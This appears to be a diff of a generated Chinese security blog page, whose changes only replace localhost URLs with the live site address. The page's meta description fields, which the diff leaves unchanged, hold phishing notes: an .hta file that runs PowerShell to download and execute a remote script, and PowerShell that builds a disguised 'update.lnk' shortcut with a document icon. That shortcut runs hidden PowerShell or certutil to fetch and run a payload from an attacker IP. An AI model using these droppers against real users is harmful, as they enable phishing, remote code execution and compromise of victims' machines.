@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+    <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="钓鱼相关\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
 <title>渊蜂之书</title>
 
-<link rel='canonical' href='http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
+<link rel='canonical' href='https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="渊蜂之书">
 <meta property='og:description' content="钓鱼相关\r.hta加载js源码\r（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）\n&lt;html&gt; &lt;head&gt; &lt;script language=&#34;JScript&#34;&gt; var shell = new ActiveXObject(&#34;WScript.Shell&#34;); shell.Run(&#34;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://攻击机IP/shell.ps1&#39;)&#34;); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;self.close();&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; lnk投放（快捷方式-命令执行）\r首先需要在测试环境生成\n加载反射源码\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -c `&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.174.129:88/shell.ps1&#39;)`&#34;&#34; $Shortcut.WindowStyle = 7 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,3&#34; $Shortcut.Save() 远程下载木马执行（无powershell）\n$WshShell = New-Object -ComObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&#34;$env:USERPROFILE\\Desktop\\update.lnk&#34;) $Shortcut.TargetPath = &#34;cmd.exe&#34; $Shortcut.Arguments = &#34;/c certutil -urlcache -split -f http://192.168.174.129:88/fuck.exe C:\\Windows\\Tasks\\fuck.exe &amp;&amp; C:\\Windows\\Tasks\\fuck.exe&#34; $Shortcut.WindowStyle = 7 # 最小化窗口 $Shortcut.IconLocation = &#34;C:\\Windows\\System32\\shell32.dll,23&#34; # 文档图标 $Shortcut.Save() 也可以利用下面的命令反向查找lnk文件指向\n">
-<meta property='og:url' content='http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
+<meta property='og:url' content='https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='社之魔法' /><meta property='article:published_time' content='2025-08-23T21:25:37&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T21:25:37&#43;08:00'/>
 <meta name="twitter:title" content="渊蜂之书">
@@ -783,7 +783,7 @@
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
